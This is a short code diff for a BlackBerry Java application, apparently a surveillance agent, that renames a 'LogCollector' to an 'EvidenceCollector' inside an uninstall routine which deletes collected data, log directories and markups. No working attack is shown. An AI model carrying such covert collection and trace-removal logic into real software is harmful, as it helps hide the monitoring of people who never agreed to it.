@@ -18,8 +18,8 @@ import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
-import blackberry.log.LogCollector;
-import blackberry.log.Markup;
+import blackberry.evidence.EvidenceCollector;
+import blackberry.evidence.Markup;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
@@ -79,7 +79,7 @@ public final class UninstallAction extends SubAction {
 
         Utils.sleep(5000);
 
-        LogCollector.getInstance().removeProgressive();
+        EvidenceCollector.getInstance().removeProgressive();
 
         final ApplicationDescriptor ad = ApplicationDescriptor
                 .currentApplicationDescriptor();
@@ -138,7 +138,7 @@ public final class UninstallAction extends SubAction {
         }
 
         Debug.stop();
-        LogCollector.getInstance().removeLogDirs();
+        EvidenceCollector.getInstance().removeLogDirs();
         Markup.removeMarkups();
 
         //#ifdef DEBUG
